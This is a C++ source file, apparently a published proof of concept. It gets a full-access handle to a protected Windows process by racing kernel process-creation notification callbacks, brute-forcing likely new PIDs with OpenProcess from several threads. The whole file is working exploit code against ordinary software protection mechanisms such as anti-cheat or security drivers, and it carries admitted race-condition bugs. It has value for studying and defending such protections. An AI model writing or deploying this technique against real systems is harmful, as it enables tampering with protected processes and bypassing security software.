/* --- DESCRIPTION
 * 
 * This program is a demonstration.
 * It outruns kernel process notification routines (set with PsSetCreateProcessNotifyRoutine) from user-land using "PID guessing/brute-forcing".
 * PsSetCreateProcessNotifyRoutine @ MSDN : https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine
 * 
 * This demonstration has flaws, for example, PIDs can be reused and it currently doesn't take that into account, but this is implementable.
 * It's also absolutely not state-of-the-art thread-safe, there's a shared resource without synchronisation (lhProcesses).
 * When the exploit completes it can still have process handles on non-existing processes for some reason.
 */

#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <vector>
#include <algorithm>
#include <list>

/* --- CONFIGURATION 
 * 
 * TARGET_PROCESS_NAME defines which process image name we are trying to get a handle on.
 * This could be another, more fine-grained check, such as checksum comparison.
 * 
 * MAX_PID_RATIO defines what is the maximum PID a process could spawn, compared to the highest current PID.
 * For example, if the highest PID is 1000 and MAX_PID_RATIO is set to 1.5, then this program will attempt to get handles on PID up to 1500 (1000 * 1.5)
 * The way Windows manages PID is undocumented but all PIDs are multiples of 4 and the OS tends to stack them on low numbers.
 * However, this method of "PID guessing/brute-forcing" is not bulletproof, the PID could be above the predicted max PID.
 * Increasing the maximum possible PID will give more PIDs to try to get handles on by the threads, therefore increasing the risk to miss the unsecured time period.
 * 
 * NBR_THREADS defines how many threads will be created and will try to get process handles on possible new PIDs.
 * 
 * DESIRED_ACCESS defines what access will be requested with (Nt)OpenProcess.
 * 
 * DESIRED_INHERITANCE defines if we request an inheritable handle.
 * 
 * SLEEP_CTRL_THREAD defines how long will the control thread (the main thread) wait between each check if we have the handle we are looking for.
 * Since this exploit is not thread-safe (lhProcesses is a shared resource without proper synchronisation) better check one to a few times per second max.
 * 
 * VERBOSE_CONSOLE_OUTPUT if defined will make the exploit print out to console its state.
 */

#define TARGET_PROCESS_NAME L"Protected.exe"
#define MAX_PID_RATIO 1.5f
#define NBR_THREADS 4
#define DESIRED_ACCESS PROCESS_ALL_ACCESS
#define DESIRED_INHERITANCE FALSE
#define SLEEP_CTRL_THREAD 333
#define VERBOSE_CONSOLE_OUTPUT

#ifdef VERBOSE_CONSOLE_OUTPUT
#include <iostream>
#endif

struct HTHEMALLPARAMS {
	DWORD dwBasePid = NULL;
	DWORD dwNbrPids = NULL;
	std::list<HANDLE>* lhProcesses = nullptr;
	std::vector<DWORD>* vdwExistingPids = nullptr;
};

CRITICAL_SECTION criticalSection;
bool bJoinThreads = false;

std::wstring GetProcessImageName(const HANDLE hProcess) {
	std::wstring wstrProcessImageName = L"";
	wchar_t wcProcessPath[MAX_PATH];
	if (!GetModuleFileNameExW(hProcess, nullptr, wcProcessPath, MAX_PATH))
		return wstrProcessImageName;
	std::wstring wstrProcessPath = wcProcessPath;
	const int pos = wstrProcessPath.find_last_of(L"\\");
	wstrProcessImageName = wstrProcessPath.substr(pos + 1, wstrProcessPath.length());
	return wstrProcessImageName;
}

void OpenProcessThemAll(const DWORD dwBasePid, const DWORD dwNbrPids, std::list<HANDLE>* lhProcesses, const std::vector<DWORD>* vdwExistingPids) {
	// Filling a list of PIDs the thread should attempt to get a handle on, excluding existing PIDs
	std::list<DWORD> pids;
	for (auto i(0); i < dwNbrPids; i += 4)
		if (!std::binary_search(vdwExistingPids->begin(), vdwExistingPids->end(), dwBasePid + i))
			pids.push_back(dwBasePid + i);

	// Main loop
	while (!bJoinThreads) {
		for (auto it = pids.begin(); it != pids.end(); ++it) {
			// TODO: (optional, over-optimization) use NtOpenProcess or direct syscall for a speed-boost
			if (const auto hProcess = OpenProcess(DESIRED_ACCESS, DESIRED_INHERITANCE, *it)) {
				EnterCriticalSection(&criticalSection);
				lhProcesses->push_back(hProcess);
				LeaveCriticalSection(&criticalSection);
				pids.erase(it);
			}
		}
	}
}

void StartOpenProcessThemAllThread(HTHEMALLPARAMS* params) {
	OpenProcessThemAll(params->dwBasePid, params->dwNbrPids, params->lhProcesses, params->vdwExistingPids);
}

std::vector<DWORD> GetAllExistingPids(const bool bSort = true) {
	std::vector<DWORD> pids;
	const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snapshot, &entry)) { CloseHandle(snapshot); return pids; }
	do
		pids.push_back(entry.th32ProcessID);
	while (Process32NextW(snapshot, &entry));
	CloseHandle(snapshot);
	if (!bSort) return pids;
	std::sort(pids.begin(), pids.end());
	return pids;
}

HANDLE GetHandleTo(const std::wstring wstrProcessName) {
#ifdef VERBOSE_CONSOLE_OUTPUT
	std::wcout << L"[ .. ] hThemAll attempting to get a process handle on \"" << TARGET_PROCESS_NAME << L"\" ..." << std::endl;
#endif

	HANDLE hProcess = nullptr;

	// Getting existing PIDs, calculating max predicted PID and dividing work for threads
	auto vdwExistingPids = GetAllExistingPids();
	if (vdwExistingPids.empty()) return hProcess;
	const auto dwMaxExistingPid = vdwExistingPids[vdwExistingPids.size() - 1];
	DWORD dwMaxPredictedPid = floor(dwMaxExistingPid * MAX_PID_RATIO);
	dwMaxPredictedPid -= dwMaxPredictedPid % 4;
	DWORD dwPidsPerThread = floor(dwMaxPredictedPid / NBR_THREADS);
	dwPidsPerThread -= dwPidsPerThread % 4;

	// Preparing critical section to secure shared resources
	InitializeCriticalSection(&criticalSection);

	// Starting threads
	std::list<HANDLE> lhProcesses;
	HANDLE hThreads[NBR_THREADS];
	SecureZeroMemory(hThreads, sizeof(hThreads));
	HTHEMALLPARAMS* pHThemAllParams[NBR_THREADS];
	SecureZeroMemory(pHThemAllParams, sizeof(pHThemAllParams));

#ifdef VERBOSE_CONSOLE_OUTPUT
	std::cout << "[ .. ] Max predicted possible PID: " << dwMaxPredictedPid << std::endl;
	std::cout << "[ .. ] Starting " << NBR_THREADS << " threads, " << (dwPidsPerThread / 4) << " possible PIDs per thread ... ";
#endif

	for (auto i(0); i < NBR_THREADS; ++i) {
		// Writing parameters on the heap and giving them to the new thread
		pHThemAllParams[i] = new HTHEMALLPARAMS;
		pHThemAllParams[i]->dwBasePid = dwPidsPerThread * i;
		pHThemAllParams[i]->dwNbrPids = dwPidsPerThread;
		pHThemAllParams[i]->lhProcesses = &lhProcesses;
		pHThemAllParams[i]->vdwExistingPids = &vdwExistingPids;
		hThreads[i] = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(StartOpenProcessThemAllThread), pHThemAllParams[i], NULL, nullptr);
	}

#ifdef VERBOSE_CONSOLE_OUTPUT
	std::cout << "Done." << std::endl;
#endif

	// Control operations looking for a handle to our target
	do {
		Sleep(SLEEP_CTRL_THREAD);
		EnterCriticalSection(&criticalSection);
		for (auto it = lhProcesses.begin(); it != lhProcesses.end(); ++it) {
			if (GetProcessImageName(*it) != wstrProcessName) {
				CloseHandle(*it);
				lhProcesses.erase(it);
				continue;
			}
			hProcess = *it;
			LeaveCriticalSection(&criticalSection);
			break;
		}
		LeaveCriticalSection(&criticalSection);
	} while (hProcess == nullptr);

	// Joining and terminating all threads, then cleaning up and returning
	bJoinThreads = true;
#ifdef VERBOSE_CONSOLE_OUTPUT
	std::cout << "[ :) ] SUCCESS !! Handle ID 0x" << std::hex << std::uppercase << reinterpret_cast<DWORD64>(hProcess) << ", PID " << std::dec << GetProcessId(hProcess) << std::endl;
	std::cout << "[ .. ] Halting, cleaning up, and returning ... ";
#endif
	WaitForMultipleObjects(NBR_THREADS, hThreads, TRUE, INFINITE);
	for (auto i(0); i < NBR_THREADS; ++i) {
		delete pHThemAllParams[i];
		CloseHandle(hThreads[i]);
	}
	for (auto it = lhProcesses.begin(); it != lhProcesses.end(); ++it) {
		if (hProcess != *it) {
			CloseHandle(*it);
			lhProcesses.erase(it);
		}
	}

	DeleteCriticalSection(&criticalSection);

#ifdef VERBOSE_CONSOLE_OUTPUT
	std::cout << "Done." << std::endl;
#endif

	return hProcess;
}

int main() {
	const auto hProcess = GetHandleTo(TARGET_PROCESS_NAME);

	system("pause");
    return EXIT_SUCCESS;
}

